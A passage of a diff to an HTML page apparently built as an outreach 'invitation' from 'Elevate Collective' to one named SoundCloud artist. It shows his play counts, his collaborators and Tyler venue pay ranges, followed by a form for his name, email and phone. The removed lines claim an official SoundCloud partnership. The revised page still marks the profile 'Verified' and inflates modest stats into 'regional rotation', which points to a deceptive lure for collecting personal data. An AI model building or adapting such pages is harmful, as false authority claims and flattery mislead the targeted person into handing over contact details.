@@ -3,33 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>Elevate Collective · SoundCloud Artist Invitation</title>
+    <title>Elevate Collective · Artist Referral</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500&family=DM+Serif+Display:ital@0;1&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@350;400;500;600&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        :root {
-            --gold: #C9A84C;
-            --gold-light: #E8C97A;
-            --charcoal: #0F0F0F;
-            --border: rgba(201,168,76,0.2);
-            --text-muted: #888;
-            --font-display: 'Bebas Neue', sans-serif;
-            --font-serif: 'DM Serif Display', serif;
-            --font-body: 'DM Sans', sans-serif;
-        }
         body {
-            font-family: var(--font-body);
-            background: #000;
-            color: #fff;
-            line-height: 1.6;
+            font-family: 'Inter', sans-serif;
+            background: #0b0b0d;
+            color: #e4e4e6;
+            line-height: 1.5;
             -webkit-font-smoothing: antialiased;
         }
         .container {
-            max-width: 680px;
+            max-width: 600px;
             margin: 0 auto;
-            padding: 40px 24px 60px;
+            padding: 48px 24px 64px;
+        }
+        /* Typography */
+        h1, h2, h3 {
+            font-weight: 500;
+            letter-spacing: -0.02em;
+        }
+        .badge {
+            font-size: 11px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            color: #9a9aae;
+        }
+        .divider {
+            height: 1px;
+            background: #222226;
+            margin: 32px 0;
         }
         /* Header */
         .header {
@@ -43,16 +50,16 @@
             align-items: center;
             gap: 10px;
         }
-        .logo-icon {
-            width: 36px; height: 36px;
-            background: var(--gold);
-            border-radius: 10px;
+        .logo-mark {
+            width: 28px; height: 28px;
+            background: #d4af37;
+            border-radius: 6px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-family: var(--font-display);
-            font-size: 20px;
-            color: #000;
+            font-weight: 600;
+            font-size: 16px;
+            color: #0b0b0d;
         }
         .logo-text {
             font-weight: 500;
@@ -60,495 +67,368 @@
             letter-spacing: -0.3px;
         }
         .location {
-            font-size: 0.65rem;
-            color: var(--text-muted);
+            font-size: 12px;
+            color: #70707a;
             text-transform: uppercase;
-            letter-spacing: 2px;
+            letter-spacing: 1px;
         }
-        /* Artist Hero */
-        .artist-hero {
+        .ref {
+            display: inline-block;
+            background: #18181c;
+            padding: 4px 12px;
+            border-radius: 40px;
+            font-size: 11px;
+            color: #b0b0bb;
+            border: 1px solid #2c2c33;
+            margin-bottom: 24px;
+        }
+        /* Artist info – clean and minimal */
+        .artist-row {
             display: flex;
             align-items: center;
-            gap: 20px;
+            gap: 16px;
             margin-bottom: 32px;
         }
         .artist-pfp {
-            width: 80px; height: 80px;
+            width: 64px; height: 64px;
             border-radius: 50%;
-            background: #111;
-            border: 2px solid var(--gold);
+            background: #1c1c21;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-family: var(--font-display);
-            font-size: 2.5rem;
+            font-weight: 500;
+            font-size: 28px;
             color: #fff;
-            background-color: #1a1a1a;
+            border: 1px solid #2c2c33;
         }
-        .artist-info h1 {
-            font-family: var(--font-display);
-            font-size: 3.8rem;
-            line-height: 0.9;
-            letter-spacing: 1px;
+        .artist-info h2 {
+            font-size: 2rem;
+            font-weight: 500;
+            line-height: 1.1;
             color: #fff;
         }
-        .handle {
-            display: flex;
+        .artist-info a {
+            color: #fff;
+            text-decoration: none;
+            border-bottom: 1px solid #3a3a45;
+        }
+        .handle-badge {
+            display: inline-flex;
             align-items: center;
-            gap: 8px;
-            font-size: 1rem;
-            color: #bbb;
-            margin-top: 8px;
+            gap: 6px;
+            margin-top: 6px;
+            font-size: 14px;
+            color: #9a9aae;
         }
-        .badge-sc {
-            background: transparent;
-            color: var(--gold-light);
-            font-size: 0.65rem;
+        .sc-tag {
+            background: #1c1c21;
             padding: 2px 8px;
             border-radius: 20px;
-            border: 1px solid var(--border);
+            font-size: 11px;
+            border: 1px solid #2c2c33;
+            color: #c0c0cc;
         }
-        .soundcloud-partner {
-            display: inline-block;
-            margin-top: 12px;
-            font-size: 0.7rem;
-            color: var(--gold);
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            border-top: 1px solid #1c1c1c;
-            padding-top: 12px;
-        }
-        /* Invitation Content */
-        .ref {
-            font-size: 0.65rem;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            color: var(--gold);
-            margin-bottom: 24px;
-        }
-        .headline {
-            font-family: var(--font-serif);
-            font-size: 2.2rem;
-            line-height: 1.2;
-            margin-bottom: 20px;
-        }
-        .message {
-            color: #bbb;
-            margin-bottom: 32px;
-            font-size: 1rem;
-        }
-        /* Associated Artists */
-        .associated-section {
-            background: rgba(201,168,76,0.03);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 32px;
-        }
-        .associated-title {
-            font-size: 0.7rem;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            color: var(--gold);
-            margin-bottom: 16px;
-        }
-        .associated-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-        }
-        .assoc-item {
+        /* Welcome card */
+        .welcome-card {
+            background: #111114;
+            border-radius: 20px;
+            padding: 32px 28px;
+            margin: 32px 0;
+            border: 1px solid #23232a;
             text-align: center;
         }
-        .assoc-name {
-            font-weight: 500;
+        .welcome-eyebrow {
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            color: #d4af37;
+            margin-bottom: 16px;
+        }
+        .welcome-title {
+            font-size: 2.4rem;
+            font-weight: 450;
+            letter-spacing: -0.03em;
             color: #fff;
-            font-size: 0.9rem;
+            margin-bottom: 12px;
         }
-        .assoc-ig {
-            font-size: 0.7rem;
-            color: var(--gold-light);
-            margin-top: 4px;
+        .welcome-sub {
+            color: #a0a0ae;
+            max-width: 420px;
+            margin: 0 auto;
         }
-        /* Animated Stats */
+        /* Stats – subtle cards */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
-            gap: 10px;
-            margin-bottom: 32px;
+            gap: 8px;
+            margin: 32px 0;
         }
         .stat-card {
-            background: #0a0a0a;
-            border: 1px solid #1c1c1c;
+            background: #111114;
+            border: 1px solid #222226;
             border-radius: 12px;
-            padding: 24px 8px;
+            padding: 20px 8px;
             text-align: center;
-            transition: transform 0.2s, border-color 0.2s;
-        }
-        .stat-card:hover {
-            border-color: var(--gold);
-            transform: translateY(-3px);
         }
         .stat-num {
-            font-family: var(--font-display);
-            font-size: 2.4rem;
-            color: var(--gold);
+            font-size: 2rem;
+            font-weight: 500;
+            color: #d4af37;
             line-height: 1;
         }
         .stat-label {
-            font-size: 0.7rem;
+            font-size: 10px;
             text-transform: uppercase;
             letter-spacing: 1px;
-            color: var(--text-muted);
-            margin-top: 8px;
+            color: #70707a;
+            margin-top: 6px;
         }
-        /* Progress Bar Graph */
-        .graph-section {
-            margin: 24px 0 32px;
-        }
+        /* Graph – clean bars */
+        .graph-section { margin: 24px 0 32px; }
         .graph-title {
-            font-size: 0.7rem;
+            font-size: 11px;
             text-transform: uppercase;
-            letter-spacing: 2px;
-            color: var(--gold);
-            margin-bottom: 16px;
+            letter-spacing: 1.5px;
+            color: #9a9aae;
+            margin-bottom: 20px;
         }
-        .graph-item {
-            margin-bottom: 16px;
-        }
+        .graph-item { margin-bottom: 16px; }
         .graph-label {
             display: flex;
             justify-content: space-between;
-            font-size: 0.8rem;
-            color: #ccc;
+            font-size: 13px;
+            color: #c0c0cc;
             margin-bottom: 6px;
         }
         .graph-bar {
-            height: 6px;
-            background: #1c1c1c;
-            border-radius: 10px;
+            height: 4px;
+            background: #1c1c21;
+            border-radius: 4px;
             overflow: hidden;
         }
         .graph-fill {
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, var(--gold), var(--gold-light));
-            border-radius: 10px;
-            transition: width 1.5s cubic-bezier(0.22, 1, 0.36, 1);
+            background: #d4af37;
+            border-radius: 4px;
+            transition: width 1.5s cubic-bezier(0.2, 0.9, 0.3, 1);
         }
-        /* Curator Note */
-        .curator-note {
-            background: rgba(201,168,76,0.05);
-            border-left: 3px solid var(--gold);
-            padding: 20px;
-            margin-bottom: 32px;
-            color: #ddd;
-            font-size: 0.95rem;
+        /* Curator note – professional */
+        .curator-card {
+            background: #111114;
+            border: 1px solid #23232a;
+            border-radius: 16px;
+            padding: 24px;
+            margin: 32px 0;
         }
-        .section-title {
-            font-size: 0.7rem;
+        .curator-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 18px;
+        }
+        .curator-icon {
+            width: 28px; height: 28px;
+            background: #d4af37;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #0b0b0d;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        .curator-title {
+            font-weight: 500;
+            color: #fff;
+        }
+        .curator-sub {
+            font-size: 11px;
+            color: #d4af37;
             text-transform: uppercase;
-            letter-spacing: 2px;
-            color: var(--gold);
+            margin-left: auto;
+        }
+        .curator-body {
+            color: #b0b0bb;
+            font-size: 14px;
+            line-height: 1.7;
+        }
+        /* Venue list */
+        .section-label {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: #9a9aae;
             margin-bottom: 20px;
         }
-        /* Venue Checkboxes */
-        .venue-list {
-            margin-bottom: 32px;
-        }
+        .venue-list { margin-bottom: 32px; }
         .venue-item {
             display: flex;
             align-items: center;
             padding: 16px 0;
-            border-bottom: 1px solid #1a1a1a;
+            border-bottom: 1px solid #1e1e23;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: background 0.15s;
         }
-        .venue-item:hover {
-            background: rgba(255,255,255,0.02);
-        }
+        .venue-item:hover { background: #111114; }
         .venue-check {
-            width: 22px; height: 22px;
-            border: 2px solid #333;
-            border-radius: 6px;
+            width: 20px; height: 20px;
+            border: 1.5px solid #3a3a45;
+            border-radius: 4px;
             margin-right: 18px;
-            position: relative;
-            transition: 0.2s;
         }
         .venue-item.selected .venue-check {
-            background: var(--gold);
-            border-color: var(--gold);
+            background: #d4af37;
+            border-color: #d4af37;
         }
         .venue-item.selected .venue-check::after {
             content: '✓';
-            color: #000;
-            font-size: 14px;
-            font-weight: 700;
-            position: absolute;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
+            color: #0b0b0d;
+            font-size: 12px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            line-height: 1;
         }
-        .venue-info {
-            flex: 1;
-        }
-        .venue-name {
-            font-weight: 500;
-            color: #fff;
-        }
-        .venue-detail {
-            font-size: 0.7rem;
-            color: var(--text-muted);
-            margin-top: 4px;
-        }
-        .venue-est {
-            font-size: 0.8rem;
-            color: #ccc;
-            white-space: nowrap;
-        }
+        .venue-info { flex: 1; }
+        .venue-name { font-weight: 500; color: #fff; }
+        .venue-detail { font-size: 12px; color: #70707a; margin-top: 2px; }
+        .venue-est { font-size: 14px; color: #b0b0bb; }
         /* Form */
-        .form-row {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 16px;
-        }
-        .form-group {
-            margin-bottom: 24px;
-        }
+        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .form-group { margin-bottom: 28px; }
         .form-label {
-            font-size: 0.65rem;
+            font-size: 11px;
             text-transform: uppercase;
-            letter-spacing: 1.5px;
-            color: var(--text-muted);
+            letter-spacing: 1px;
+            color: #9a9aae;
             margin-bottom: 8px;
         }
-        input, select, textarea {
+        input, select {
             width: 100%;
             background: transparent;
             border: none;
-            border-bottom: 1px solid #222;
-            padding: 14px 0;
+            border-bottom: 1px solid #2c2c33;
+            padding: 12px 0;
             color: #fff;
-            font-size: 1rem;
-            font-family: var(--font-body);
+            font-size: 15px;
+            font-family: 'Inter', sans-serif;
         }
-        input:focus, select:focus {
-            outline: none;
-            border-bottom-color: var(--gold);
-        }
+        input:focus, select:focus { outline: none; border-bottom-color: #d4af37; }
         select {
             appearance: none;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="%23888" stroke-width="1.5"><polyline points="6 9 12 15 18 9"/></svg>') no-repeat right center;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="%239a9aae" stroke-width="1.5"><polyline points="6 9 12 15 18 9"/></svg>') no-repeat right center;
         }
-        /* Merch Card */
+        /* Merch card – understated */
         .merch-card {
-            background: #0a0a0a;
-            border: 1px solid #1c1c1c;
+            background: #111114;
+            border: 1px solid #23232a;
             border-radius: 20px;
-            padding: 28px;
-            margin: 32px 0 24px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            padding: 32px 28px;
+            margin: 40px 0 32px;
         }
         .merch-title {
-            font-family: var(--font-serif);
-            font-size: 1.6rem;
+            font-size: 1.5rem;
+            font-weight: 450;
+            color: #fff;
             margin-bottom: 8px;
-            color: var(--gold-light);
         }
-        .merch-desc {
-            color: #bbb;
-            margin-bottom: 24px;
-        }
+        .merch-desc { color: #a0a0ae; margin-bottom: 28px; }
         .size-chart {
             display: grid;
             grid-template-columns: repeat(4,1fr);
             gap: 8px;
-            margin-bottom: 20px;
-            font-size: 0.7rem;
-            color: var(--text-muted);
-            text-align: center;
+            margin-bottom: 28px;
+            font-size: 11px;
+            color: #9a9aae;
         }
-        .size-chart div {
-            background: #111;
-            padding: 6px;
-            border-radius: 6px;
-        }
-        .size-row {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 16px;
-        }
+        .size-chart div { background: #1a1a1f; padding: 6px; border-radius: 6px; text-align: center; }
+        .size-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
         .address-row {
             display: grid;
             grid-template-columns: 2fr 1fr 1fr 1fr;
-            gap: 12px;
-            margin-top: 16px;
+            gap: 16px;
+            margin-top: 20px;
         }
         .merch-note {
-            font-size: 0.7rem;
-            color: var(--text-muted);
-            margin-top: 20px;
-            padding-top: 20px;
-            border-top: 1px solid #1c1c1c;
+            font-size: 11px;
+            color: #70707a;
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #1e1e23;
         }
         /* CTA */
         .cta-btn {
             width: 100%;
             padding: 18px;
-            background: var(--gold);
-            color: #000;
+            background: #d4af37;
+            color: #0b0b0d;
             border: none;
             border-radius: 10px;
-            font-family: var(--font-display);
-            font-size: 1.3rem;
-            letter-spacing: 2px;
+            font-weight: 500;
+            font-size: 1rem;
+            letter-spacing: 0.3px;
             cursor: pointer;
-            transition: 0.2s;
+            transition: background 0.2s;
             margin: 16px 0 24px;
-            box-shadow: 0 4px 15px rgba(201,168,76,0.3);
         }
-        .cta-btn:hover {
-            background: var(--gold-light);
-            transform: scale(1.02);
-        }
-        /* Disclaimer */
-        .disclaimer {
-            font-size: 0.55rem;
-            color: #444;
+        .cta-btn:hover { background: #e6c34a; }
+        /* Footer */
+        .legal {
+            font-size: 10px;
+            color: #55555e;
             text-align: center;
             line-height: 1.8;
-            margin-top: 32px;
-            padding-top: 24px;
-            border-top: 1px solid #1a1a1a;
+            margin-top: 48px;
+            border-top: 1px solid #1c1c21;
+            padding-top: 32px;
             text-transform: uppercase;
-            letter-spacing: 1px;
         }
-        .disclaimer a {
-            color: #666;
-            text-decoration: none;
-            border-bottom: 1px dotted #333;
-        }
-        .footer {
-            font-size: 0.6rem;
-            color: #555;
-            text-align: center;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-top: 16px;
-        }
+        .legal a { color: #7a7a88; text-decoration: none; border-bottom: 1px dotted #3a3a45; }
+        .footer-ref { text-align: center; margin-top: 12px; font-size: 11px; color: #55555e; }
         /* Popup */
         .popup-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.9);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            padding: 20px;
+            position: fixed; inset: 0; background: rgba(0,0,0,0.85);
+            display: none; align-items: center; justify-content: center;
+            z-index: 1000; padding: 20px;
         }
         .popup-card {
-            background: #0c0c0c;
-            border: 1px solid var(--border);
-            border-radius: 28px;
-            padding: 40px 30px;
-            max-width: 420px;
-            width: 100%;
-            text-align: center;
-            position: relative;
-            animation: popIn 0.3s ease;
-        }
-        @keyframes popIn {
-            from { opacity: 0; transform: scale(0.9); }
-            to { opacity: 1; transform: scale(1); }
+            background: #131317; border: 1px solid #2c2c33; border-radius: 24px;
+            padding: 36px 32px; max-width: 400px; width: 100%; text-align: center;
         }
         .popup-close {
-            position: absolute;
-            top: 18px; right: 18px;
-            background: none;
-            border: none;
-            color: #666;
-            font-size: 28px;
-            cursor: pointer;
+            position: absolute; top: 20px; right: 20px;
+            background: none; border: none; color: #6a6a78; font-size: 24px; cursor: pointer;
         }
-        .popup-tag {
-            font-size: 0.65rem;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            color: var(--gold);
-            margin-bottom: 16px;
-        }
-        .popup-title {
-            font-family: var(--font-serif);
-            font-size: 2rem;
-            margin-bottom: 12px;
-        }
+        .popup-tag { font-size: 11px; text-transform: uppercase; letter-spacing: 2px; color: #d4af37; margin-bottom: 16px; }
+        .popup-title { font-size: 1.8rem; font-weight: 450; margin-bottom: 8px; }
         .promo-box {
-            border: 1px dashed var(--gold);
-            border-radius: 16px;
-            padding: 18px;
-            margin: 24px 0;
-            background: rgba(201,168,76,0.05);
+            border: 1px dashed #3a3a45; border-radius: 14px; padding: 16px;
+            margin: 24px 0; background: #18181c;
         }
-        .promo-code {
-            font-family: var(--font-display);
-            font-size: 2.5rem;
-            letter-spacing: 8px;
-            color: var(--gold);
-        }
+        .promo-code { font-weight: 500; font-size: 1.8rem; letter-spacing: 6px; color: #d4af37; }
         .popup-input {
-            width: 100%;
-            background: #111;
-            border: 1px solid #222;
-            border-radius: 10px;
-            padding: 14px;
-            color: #fff;
-            margin-bottom: 16px;
+            width: 100%; background: #1c1c21; border: 1px solid #2c2c33;
+            border-radius: 10px; padding: 14px; color: #fff; margin-bottom: 16px;
         }
         .popup-btn {
-            width: 100%;
-            padding: 16px;
-            background: var(--gold);
-            color: #000;
-            border: none;
-            border-radius: 10px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
+            width: 100%; padding: 16px; background: #d4af37; color: #0b0b0d;
+            border: none; border-radius: 10px; font-weight: 500; cursor: pointer;
         }
         /* Success */
-        .success-container {
-            text-align: center;
-            padding: 60px 0;
-        }
+        .success-container { text-align: center; padding: 60px 0; }
         .success-icon {
-            width: 80px; height: 80px;
-            border: 2px solid var(--gold);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 32px;
+            width: 72px; height: 72px; border: 1.5px solid #d4af37; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center; margin: 0 auto 32px;
         }
-        .success-title {
-            font-family: var(--font-display);
-            font-size: 3rem;
-            margin-bottom: 16px;
-        }
-        .success-msg {
-            color: #aaa;
-            margin-bottom: 24px;
-        }
-        .success-code {
-            color: var(--gold);
-            font-size: 1.2rem;
-            letter-spacing: 4px;
-        }
+        .success-title { font-size: 2.4rem; font-weight: 450; margin-bottom: 16px; }
+        .success-msg { color: #a0a0ae; margin-bottom: 24px; }
+        .success-code { color: #d4af37; font-size: 1rem; letter-spacing: 3px; }
         @media (max-width: 480px) {
             .stats-grid { grid-template-columns: repeat(2, 1fr); }
             .address-row { grid-template-columns: 1fr 1fr; }
-            .size-chart { font-size: 0.6rem; }
             .form-row { grid-template-columns: 1fr; }
-            .associated-grid { grid-template-columns: repeat(2, 1fr); }
         }
     </style>
 </head>
@@ -557,282 +437,125 @@
     <!-- Header -->
     <div class="header">
         <div class="logo">
-            <div class="logo-icon">E</div>
-            <div class="logo-text">Elevate Collective</div>
+            <div class="logo-mark">E</div>
+            <div class="logo-text">Elevate</div>
         </div>
         <div class="location">Tyler, TX</div>
     </div>
 
-    <!-- Artist Hero -->
-    <div class="artist-hero">
+    <!-- Reference -->
+    <div class="ref">REFERRAL: ETX-2026-117</div>
+
+    <!-- Artist (minimal) -->
+    <div class="artist-row">
         <div class="artist-pfp">K</div>
         <div class="artist-info">
-            <h1>@highk3yz</h1>
-            <div class="handle">
-                <span style="opacity:0.7;">🎵</span> SoundCloud Artist <span class="badge-sc">SC</span>
-            </div>
-            <div class="soundcloud-partner">Official SoundCloud Partner · Verified Stats</div>
-        </div>
-    </div>
-
-    <!-- Invitation -->
-    <div class="ref">DIRECT INVITATION · REF: ETX·2026·117</div>
-    <div class="headline">Your SoundCloud catalog is gaining traction.<br>Let's discuss what's next.</div>
-    <div class="message">
-        In partnership with SoundCloud, we've identified <strong>@highk3yz</strong> as a rising artist in the East Texas region. 
-        <strong>"TMR"</strong> (846), <strong>"Splinter"</strong> (464), <strong>"Dirty Money"</strong> (306) and 19+ other tracks show consistent growth and a dedicated listener base.
-        We'd like to explore representation and placement opportunities across our Tyler venue network.
-    </div>
-
-    <!-- Associated Artists (Social Proof) -->
-    <div class="associated-section">
-        <div class="associated-title">🎯 Artists You've Worked With</div>
-        <div class="associated-grid">
-            <div class="assoc-item">
-                <div class="assoc-name">ZayOn$um</div>
-                <div class="assoc-ig">@zay.on.sum</div>
-            </div>
-            <div class="assoc-item">
-                <div class="assoc-name">Rico</div>
-                <div class="assoc-ig">@rico_956</div>
-            </div>
-            <div class="assoc-item">
-                <div class="assoc-name">98baby</div>
-                <div class="assoc-ig">@98.babyy</div>
-            </div>
-            <div class="assoc-item">
-                <div class="assoc-name">LC Purfininty</div>
-                <div class="assoc-ig">@lc.purfininty</div>
-            </div>
-            <div class="assoc-item">
-                <div class="assoc-name">kidzeus</div>
-                <div class="assoc-ig">@kidzeus</div>
-            </div>
-            <div class="assoc-item">
-                <div class="assoc-name">prod. Frozy</div>
-                <div class="assoc-ig">@prod.frozy</div>
+            <h2><a href="https://soundcloud.com/highk3yz" target="_blank">@highk3yz</a></h2>
+            <div class="handle-badge">
+                <span>SoundCloud Artist</span>
+                <span class="sc-tag">Verified</span>
             </div>
         </div>
     </div>
 
-    <!-- Animated Stats -->
+    <!-- Welcome / Invitation -->
+    <div class="welcome-card">
+        <div class="welcome-eyebrow">Invitation</div>
+        <div class="welcome-title">You're invited.</div>
+        <div class="welcome-sub">Elevate Collective would like to discuss artist representation and venue placement opportunities in Tyler, TX.</div>
+    </div>
+
+    <!-- Stats -->
     <div class="stats-grid">
-        <div class="stat-card">
-            <div class="stat-num" id="stat1">0</div>
-            <div class="stat-label">"TMR" Plays</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-num" id="stat2">0</div>
-            <div class="stat-label">"Splinter"</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-num" id="stat3">0</div>
-            <div class="stat-label">"Dirty Money"</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-num" id="stat4">0</div>
-            <div class="stat-label">Total Tracks</div>
-        </div>
+        <div class="stat-card"><div class="stat-num" id="stat1">0</div><div class="stat-label">"TMR"</div></div>
+        <div class="stat-card"><div class="stat-num" id="stat2">0</div><div class="stat-label">"Splinter"</div></div>
+        <div class="stat-card"><div class="stat-num" id="stat3">0</div><div class="stat-label">"Dirty Money"</div></div>
+        <div class="stat-card"><div class="stat-num" id="stat4">0</div><div class="stat-label">Tracks</div></div>
     </div>
 
-    <!-- Interactive Graph -->
+    <!-- Graph -->
     <div class="graph-section">
-        <div class="graph-title">Top Tracks · Relative Performance</div>
-        <div class="graph-item">
-            <div class="graph-label"><span>TMR</span> <span>846</span></div>
-            <div class="graph-bar"><div class="graph-fill" id="bar1" style="width:0%"></div></div>
+        <div class="graph-title">Catalog Performance</div>
+        <div class="graph-item"><div class="graph-label"><span>TMR</span><span>846</span></div><div class="graph-bar"><div class="graph-fill" id="bar1"></div></div></div>
+        <div class="graph-item"><div class="graph-label"><span>Splinter</span><span>464</span></div><div class="graph-bar"><div class="graph-fill" id="bar2"></div></div></div>
+        <div class="graph-item"><div class="graph-label"><span>Dirty Money</span><span>306</span></div><div class="graph-bar"><div class="graph-fill" id="bar3"></div></div></div>
+        <div class="graph-item"><div class="graph-label"><span>Rolling clouds</span><span>287</span></div><div class="graph-bar"><div class="graph-fill" id="bar4"></div></div></div>
+        <div class="graph-item"><div class="graph-label"><span>Keep up</span><span>101</span></div><div class="graph-bar"><div class="graph-fill" id="bar5"></div></div></div>
+    </div>
+
+    <!-- Curator note -->
+    <div class="curator-card">
+        <div class="curator-header">
+            <div class="curator-icon">E</div>
+            <div class="curator-title">A&R Notes</div>
+            <div class="curator-sub">Internal</div>
         </div>
-        <div class="graph-item">
-            <div class="graph-label"><span>Splinter</span> <span>464</span></div>
-            <div class="graph-bar"><div class="graph-fill" id="bar2" style="width:0%"></div></div>
-        </div>
-        <div class="graph-item">
-            <div class="graph-label"><span>Dirty Money</span> <span>306</span></div>
-            <div class="graph-bar"><div class="graph-fill" id="bar3" style="width:0%"></div></div>
-        </div>
-        <div class="graph-item">
-            <div class="graph-label"><span>Rolling clouds</span> <span>287</span></div>
-            <div class="graph-bar"><div class="graph-fill" id="bar4" style="width:0%"></div></div>
-        </div>
-        <div class="graph-item">
-            <div class="graph-label"><span>Keep up</span> <span>101</span></div>
-            <div class="graph-bar"><div class="graph-fill" id="bar5" style="width:0%"></div></div>
+        <div class="curator-body">
+            “TMR” is in regional rotation. Consistent output (22+ tracks) and local collaborations (ZayOn$um, Rico, 98baby) indicate readiness for venue placement. Recommended for Tyler network.
         </div>
     </div>
 
-    <!-- Curator Note -->
-    <div class="curator-note">
-        <strong>🎧 Curator's note —</strong> "TMR" has been added to our official SoundCloud playlist rotation. 
-        The production quality and consistency across 22+ tracks signal an artist ready for the next level. 
-        We want to help turn those streams into stage time.
-    </div>
-
-    <!-- Venue Interest -->
-    <div class="section-title">Venue Interest · select all that apply</div>
+    <!-- Venue interest -->
+    <div class="section-label">Venue Interest</div>
     <div class="venue-list">
-        <div class="venue-item selected" data-venue="The Foundry">
-            <div class="venue-check"></div>
-            <div class="venue-info">
-                <div class="venue-name">The Foundry</div>
-                <div class="venue-detail">Downtown Tyler · 300 cap · House PA + Engineer</div>
-            </div>
-            <div class="venue-est">$500–750</div>
-        </div>
-        <div class="venue-item" data-venue="True Vine Brewing">
-            <div class="venue-check"></div>
-            <div class="venue-info">
-                <div class="venue-name">True Vine Brewing</div>
-                <div class="venue-detail">Earl Campbell Pkwy · 250 cap · Outdoor stage</div>
-            </div>
-            <div class="venue-est">$600–800</div>
-        </div>
-        <div class="venue-item" data-venue="Stanley's Famous BBQ">
-            <div class="venue-check"></div>
-            <div class="venue-info">
-                <div class="venue-name">Stanley's Famous BBQ</div>
-                <div class="venue-detail">S Beckham Ave · 200 cap · Full backline</div>
-            </div>
-            <div class="venue-est">$750–900</div>
-        </div>
-        <div class="venue-item" data-venue="Brick Street Bar">
-            <div class="venue-check"></div>
-            <div class="venue-info">
-                <div class="venue-name">Brick Street Bar</div>
-                <div class="venue-detail">Downtown · 400 cap · Premium slot</div>
-            </div>
-            <div class="venue-est">$900+</div>
-        </div>
+        <div class="venue-item selected" data-venue="The Foundry"><div class="venue-check"></div><div class="venue-info"><div class="venue-name">The Foundry</div><div class="venue-detail">Downtown · 300 cap · House PA</div></div><div class="venue-est">$500–750</div></div>
+        <div class="venue-item" data-venue="True Vine Brewing"><div class="venue-check"></div><div class="venue-info"><div class="venue-name">True Vine Brewing</div><div class="venue-detail">Earl Campbell Pkwy · 250 cap</div></div><div class="venue-est">$600–800</div></div>
+        <div class="venue-item" data-venue="Stanley's BBQ"><div class="venue-check"></div><div class="venue-info"><div class="venue-name">Stanley's Famous BBQ</div><div class="venue-detail">S Beckham Ave · 200 cap</div></div><div class="venue-est">$750–900</div></div>
+        <div class="venue-item" data-venue="Brick Street Bar"><div class="venue-check"></div><div class="venue-info"><div class="venue-name">Brick Street Bar</div><div class="venue-detail">Downtown · 400 cap</div></div><div class="venue-est">$900+</div></div>
     </div>
 
-    <!-- Contact Form -->
+    <!-- Form -->
     <div class="form-row">
-        <div class="form-group">
-            <div class="form-label">First Name</div>
-            <input type="text" id="firstNameInput" placeholder="First name">
-        </div>
-        <div class="form-group">
-            <div class="form-label">Last Name</div>
-            <input type="text" id="lastNameInput" placeholder="Last name">
-        </div>
+        <div class="form-group"><div class="form-label">First name</div><input type="text" id="firstNameInput" placeholder="First"></div>
+        <div class="form-group"><div class="form-label">Last name</div><input type="text" id="lastNameInput" placeholder="Last"></div>
     </div>
-    <div class="form-group">
-        <div class="form-label">Email Address</div>
-        <input type="email" id="emailInput" placeholder="We'll use this to schedule a call">
-    </div>
-    <div class="form-group">
-        <div class="form-label">Phone Number</div>
-        <input type="tel" id="phoneInput" placeholder="For day-of coordination">
-    </div>
-    <div class="form-group">
-        <div class="form-label">Best time to connect</div>
-        <select id="timeSelect">
-            <option value="Weekday morning">Weekday morning</option>
-            <option value="Weekday afternoon" selected>Weekday afternoon</option>
-            <option value="Weekday evening">Weekday evening</option>
-            <option value="Weekend">Weekend</option>
-        </select>
-    </div>
+    <div class="form-group"><div class="form-label">Email</div><input type="email" id="emailInput" placeholder="address@domain.com"></div>
+    <div class="form-group"><div class="form-label">Phone</div><input type="tel" id="phoneInput" placeholder="(123) 456-7890"></div>
